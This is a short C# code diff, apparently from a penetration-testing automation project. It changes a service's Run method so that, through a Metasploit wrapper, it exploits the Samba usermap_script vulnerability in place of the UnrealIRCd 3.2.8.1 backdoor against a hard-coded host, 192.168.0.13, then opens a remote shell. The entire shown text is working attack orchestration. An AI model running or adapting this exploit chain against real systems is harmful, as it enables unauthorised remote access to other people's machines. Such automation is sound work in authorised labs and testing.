@@ -24,9 +24,14 @@ namespace Lacey.Alexa.Explorer.Services.Services.Concrete
         public async Task Run()
         {
             const string rHost = "192.168.0.13";
-            var mhr= await _metasploit.MultiHandlerExec();
-            await _metasploit.UnrealIrcd3281BackdoorExec(rHost);
-            var shell = await _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, mhr.JobId);
+            // var exploit= await _metasploit.MultiHandlerExec();
+            // await _metasploit.UnrealIrcd3281BackdoorExec(rHost);
+            // var shell = await _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, exploit.JobId);
+            // await _metasploit.RunShell(shell.First().Key);
+
+            var exploit = await _metasploit.MultiHandlerExec();
+            await _metasploit.UsermapScriptExec(rHost);
+            var shell = await _metasploit.WaitModuleJob(ModuleNames.UsermapScript, exploit.JobId);
             await _metasploit.RunShell(shell.First().Key);
         }
     }
